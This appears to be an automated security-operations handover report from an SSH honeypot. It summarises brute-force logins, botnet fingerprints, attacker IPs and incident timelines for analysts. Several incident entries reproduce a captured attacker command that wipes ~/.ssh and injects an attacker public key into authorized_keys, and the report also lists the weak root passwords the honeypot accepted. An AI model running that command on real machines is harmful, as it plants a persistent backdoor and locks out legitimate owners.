# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-04 |
| **Generated At** | 2026-06-04T16:57:02Z |
| **Shift Time** | 16:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **263** |
| Confirmed Threats | **252** |
| False Positives Filtered | **11** (4.2%) |
| Unique Attacker IPs | **27** |
| Countries of Origin | **16** |
| High Severity Cases | **27** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **236** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **89** |
| Unique Credential Pairs | **61** |
| Unique Usernames | **48** |
| Unique Passwords | **51** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 27 |
| `345gs5662d34` | 13 |
| `it` | 2 |
| `castle` | 2 |
| `juliana` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `123456` | 9 |
| `password` | 2 |
| `castle1!` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 13 |
| `castle` | `castle1!` | 2 |
| `juliana` | `juliana` | 2 |
| `root` | `Ls123456@` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `585858` | `43.173.249.11` | 2026-06-04T12:52:08 |
| `root` | `3245gs5662d34` | `43.173.249.11` | 2026-06-04T12:52:10 |
| `root` | `Cb123456@` | `43.173.249.11` | 2026-06-04T12:58:34 |
| `root` | `qwe123qwe` | `43.173.249.11` | 2026-06-04T13:02:58 |
| `root` | `admin` | `176.65.148.44` | 2026-06-04T15:12:01 |
| `root` | `fuckyou` | `89.58.10.55` | 2026-06-04T16:09:55 |
| `root` | `3245gs5662d34` | `89.58.10.55` | 2026-06-04T16:09:58 |
| `root` | `Ubuntu@2024` | `89.58.10.55` | 2026-06-04T16:11:44 |
| `root` | `qwertyuiop123.` | `103.67.80.61` | 2026-06-04T16:31:18 |
| `root` | `3245gs5662d34` | `103.67.80.61` | 2026-06-04T16:31:21 |
| `root` | `WH123456@` | `103.67.80.61` | 2026-06-04T16:33:32 |
| `root` | `Ls123456@` | `139.198.113.29` | 2026-06-04T16:36:15 |
| `root` | `3245gs5662d34` | `139.198.113.29` | 2026-06-04T16:36:18 |
| `root` | `2043` | `103.67.80.61` | 2026-06-04T16:44:20 |
| `root` | `2043` | `139.198.113.29` | 2026-06-04T16:49:07 |
| `root` | `123456.Aa` | `103.67.80.61` | 2026-06-04T16:50:55 |
| `root` | `Ls123456@` | `103.67.80.61` | 2026-06-04T16:53:12 |
| `root` | `password111` | `103.67.80.61` | 2026-06-04T16:55:14 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **263** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 101 |
| Go SSH scanner | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 89 | 7 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |
| `a289c065bf37...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 89 | 7 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 2 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `a289c065bf37...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `89.58.10.55`, `103.67.80.61`, `43.173.249.11`, `139.198.113.29`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **27** |
| Unique ASNs | **24** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | MEDIUM |
| `AS63996` | Mazeda Networks Limited | 2 | LOW |
| `AS396982` | Google LLC | 2 | LOW |
| `AS209334` | Modat B.V. | 1 | HIGH |
| `AS134366` | Cloud Computing HK Limited | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS55736` | Dataknox Pty Limited | 1 | MEDIUM |
| `AS152001` | PT Komunikasi Profesional Indonesia | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (27)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-55aef72d7513

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:52 |
| **Last Seen** | 2026-06-04 12:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:52:07` | `cowrie.session.connect` |
| `2026-06-04 12:52:07` | `cowrie.client.version` |
| `2026-06-04 12:52:07` | `cowrie.client.kex` |
| `2026-06-04 12:52:08` | `cowrie.login.success` |
| `2026-06-04 12:52:08` | `cowrie.session.params` |
| `2026-06-04 12:52:08` | `cowrie.command.input` |
| `2026-06-04 12:52:08` | `cowrie.command.failed` |
| `2026-06-04 12:52:08` | `cowrie.log.closed` |
| `2026-06-04 12:52:08` | `cowrie.session.params` |
| `2026-06-04 12:52:08` | `cowrie.command.input` |
| `2026-06-04 12:52:08` | `cowrie.session.file_download` |
| `2026-06-04 12:52:08` | `cowrie.log.closed` |
| `2026-06-04 12:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8cb03ab48db

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:52 |
| **Last Seen** | 2026-06-04 12:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:52:10` | `cowrie.session.connect` |
| `2026-06-04 12:52:10` | `cowrie.client.version` |
| `2026-06-04 12:52:10` | `cowrie.client.kex` |
| `2026-06-04 12:52:10` | `cowrie.login.success` |
| `2026-06-04 12:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe41c2847bd0

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:58 |
| **Last Seen** | 2026-06-04 12:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:58:33` | `cowrie.session.connect` |
| `2026-06-04 12:58:33` | `cowrie.client.version` |
| `2026-06-04 12:58:33` | `cowrie.client.kex` |
| `2026-06-04 12:58:34` | `cowrie.login.success` |
| `2026-06-04 12:58:34` | `cowrie.session.params` |
| `2026-06-04 12:58:34` | `cowrie.command.input` |
| `2026-06-04 12:58:34` | `cowrie.command.failed` |
| `2026-06-04 12:58:34` | `cowrie.log.closed` |
| `2026-06-04 12:58:34` | `cowrie.session.params` |
| `2026-06-04 12:58:34` | `cowrie.command.input` |
| `2026-06-04 12:58:34` | `cowrie.session.file_download` |
| `2026-06-04 12:58:34` | `cowrie.log.closed` |
| `2026-06-04 12:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c785b8f976

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:58 |
| **Last Seen** | 2026-06-04 12:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:58:36` | `cowrie.session.connect` |
| `2026-06-04 12:58:36` | `cowrie.client.version` |
| `2026-06-04 12:58:36` | `cowrie.client.kex` |
| `2026-06-04 12:58:37` | `cowrie.login.success` |
| `2026-06-04 12:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e062db0070d

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 13:02 |
| **Last Seen** | 2026-06-04 13:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 13:02:58` | `cowrie.session.connect` |
| `2026-06-04 13:02:58` | `cowrie.client.version` |
| `2026-06-04 13:02:58` | `cowrie.client.kex` |
| `2026-06-04 13:02:58` | `cowrie.login.success` |
| `2026-06-04 13:02:59` | `cowrie.session.params` |
| `2026-06-04 13:02:59` | `cowrie.command.input` |
| `2026-06-04 13:02:59` | `cowrie.command.failed` |
| `2026-06-04 13:02:59` | `cowrie.log.closed` |
| `2026-06-04 13:02:59` | `cowrie.session.params` |
| `2026-06-04 13:02:59` | `cowrie.command.input` |
| `2026-06-04 13:02:59` | `cowrie.session.file_download` |
| `2026-06-04 13:02:59` | `cowrie.log.closed` |
| `2026-06-04 13:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8e91c2c2ac8

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 13:03 |
| **Last Seen** | 2026-06-04 13:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 13:03:01` | `cowrie.session.connect` |
| `2026-06-04 13:03:01` | `cowrie.client.version` |
| `2026-06-04 13:03:01` | `cowrie.client.kex` |
| `2026-06-04 13:03:01` | `cowrie.login.success` |
| `2026-06-04 13:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-618bbe1564a9

| Field | Detail |
|---|---|
| **Source IP** | `176.65.148[.]44` |
| **First Seen** | 2026-06-04 15:11 |
| **Last Seen** | 2026-06-04 15:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 15:11:59` | `cowrie.session.connect` |
| `2026-06-04 15:12:00` | `cowrie.client.version` |
| `2026-06-04 15:12:00` | `cowrie.client.kex` |
| `2026-06-04 15:12:01` | `cowrie.login.success` |
| `2026-06-04 15:12:01` | `cowrie.direct-tcpip.request` |
| `2026-06-04 15:12:02` | `cowrie.direct-tcpip.ja4` |
| `2026-06-04 15:12:02` | `cowrie.direct-tcpip.data` |
| `2026-06-04 15:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.148[.]44` to AbuseIPDB if not already reported
- [ ] Block `176.65.148[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ee45985349

| Field | Detail |
|---|---|
| **Source IP** | `89.58.10[.]55` |
| **First Seen** | 2026-06-04 16:09 |
| **Last Seen** | 2026-06-04 16:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:09:54` | `cowrie.session.connect` |
| `2026-06-04 16:09:54` | `cowrie.client.version` |
| `2026-06-04 16:09:54` | `cowrie.client.kex` |
| `2026-06-04 16:09:55` | `cowrie.login.success` |
| `2026-06-04 16:09:55` | `cowrie.session.params` |
| `2026-06-04 16:09:55` | `cowrie.command.input` |
| `2026-06-04 16:09:55` | `cowrie.command.failed` |
| `2026-06-04 16:09:55` | `cowrie.log.closed` |
| `2026-06-04 16:09:55` | `cowrie.session.params` |
| `2026-06-04 16:09:55` | `cowrie.command.input` |
| `2026-06-04 16:09:55` | `cowrie.session.file_download` |
| `2026-06-04 16:09:55` | `cowrie.log.closed` |
| `2026-06-04 16:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.58.10[.]55` to AbuseIPDB if not already reported
- [ ] Block `89.58.10[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2001da18c518

| Field | Detail |
|---|---|
| **Source IP** | `89.58.10[.]55` |
| **First Seen** | 2026-06-04 16:09 |
| **Last Seen** | 2026-06-04 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:09:57` | `cowrie.session.connect` |
| `2026-06-04 16:09:57` | `cowrie.client.version` |
| `2026-06-04 16:09:58` | `cowrie.client.kex` |
| `2026-06-04 16:09:58` | `cowrie.login.success` |
| `2026-06-04 16:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.58.10[.]55` to AbuseIPDB if not already reported
- [ ] Block `89.58.10[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-502ffb8209d0

| Field | Detail |
|---|---|
| **Source IP** | `89.58.10[.]55` |
| **First Seen** | 2026-06-04 16:11 |
| **Last Seen** | 2026-06-04 16:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:11:43` | `cowrie.session.connect` |
| `2026-06-04 16:11:43` | `cowrie.client.version` |
| `2026-06-04 16:11:43` | `cowrie.client.kex` |
| `2026-06-04 16:11:44` | `cowrie.login.success` |
| `2026-06-04 16:11:44` | `cowrie.session.params` |
| `2026-06-04 16:11:44` | `cowrie.command.input` |
| `2026-06-04 16:11:44` | `cowrie.command.failed` |
| `2026-06-04 16:11:44` | `cowrie.log.closed` |
| `2026-06-04 16:11:44` | `cowrie.session.params` |
| `2026-06-04 16:11:44` | `cowrie.command.input` |
| `2026-06-04 16:11:44` | `cowrie.session.file_download` |
| `2026-06-04 16:11:44` | `cowrie.log.closed` |
| `2026-06-04 16:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.58.10[.]55` to AbuseIPDB if not already reported
- [ ] Block `89.58.10[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07fbb8a7d27f

| Field | Detail |
|---|---|
| **Source IP** | `89.58.10[.]55` |
| **First Seen** | 2026-06-04 16:11 |
| **Last Seen** | 2026-06-04 16:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:11:46` | `cowrie.session.connect` |
| `2026-06-04 16:11:46` | `cowrie.client.version` |
| `2026-06-04 16:11:47` | `cowrie.client.kex` |
| `2026-06-04 16:11:47` | `cowrie.login.success` |
| `2026-06-04 16:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.58.10[.]55` to AbuseIPDB if not already reported
- [ ] Block `89.58.10[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-179584ea51fd

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 16:31 |
| **Last Seen** | 2026-06-04 16:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:31:18` | `cowrie.session.connect` |
| `2026-06-04 16:31:18` | `cowrie.client.version` |
| `2026-06-04 16:31:18` | `cowrie.client.kex` |
| `2026-06-04 16:31:18` | `cowrie.login.success` |
| `2026-06-04 16:31:18` | `cowrie.session.params` |
| `2026-06-04 16:31:18` | `cowrie.command.input` |
| `2026-06-04 16:31:18` | `cowrie.command.failed` |
| `2026-06-04 16:31:18` | `cowrie.log.closed` |
| `2026-06-04 16:31:19` | `cowrie.session.params` |
| `2026-06-04 16:31:19` | `cowrie.command.input` |
| `2026-06-04 16:31:19` | `cowrie.session.file_download` |
| `2026-06-04 16:31:19` | `cowrie.log.closed` |
| `2026-06-04 16:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67d0c2be3fda

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 16:31 |
| **Last Seen** | 2026-06-04 16:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:31:20` | `cowrie.session.connect` |
| `2026-06-04 16:31:20` | `cowrie.client.version` |
| `2026-06-04 16:31:20` | `cowrie.client.kex` |
| `2026-06-04 16:31:21` | `cowrie.login.success` |
| `2026-06-04 16:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7baa7040bab

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 16:33 |
| **Last Seen** | 2026-06-04 16:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
